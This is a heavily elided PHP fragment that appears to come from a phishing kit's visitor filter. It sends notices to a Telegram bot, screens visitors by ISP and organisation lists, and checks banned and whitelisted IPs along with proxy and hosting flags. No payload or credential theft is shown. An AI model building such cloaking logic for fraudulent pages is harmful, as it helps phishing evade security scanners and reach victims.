...
function sendWL($message, $chatid) {
    ...
    if (function_exists('curl_version')) {
        ...
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($query_params));
    }
}
...
function CheckIspOrg($org, $isp, $isps) {
    foreach ($isps as $country => $ispList) {
        foreach ($ispList as $ispItem) {
            if (is_string($isp) && stripos(strtolower($isp), strtolower($ispItem)) !== false) {
                return false;
            }
        }
        foreach ($ispList as $ispItem) {
            if (is_string($org) && stripos(strtolower($org), strtolower($ispItem)) !== false) {
                return false;
            }
        }
    }
...
function checkIP() {
    ...
    return in_array($_SERVER['REMOTE_ADDR'], $banned_values);
}
...
if (!in_array($_SERVER['REMOTE_ADDR'], $whitelisted_values)) {
    ...
    $isp = $_SESSION['isp'] ?? '';
    $org = $_SESSION['org'] ?? '';
    $proxy = $_SESSION['proxy'] ?? false;
    $hosting = $_SESSION['hosting'] ?? false;
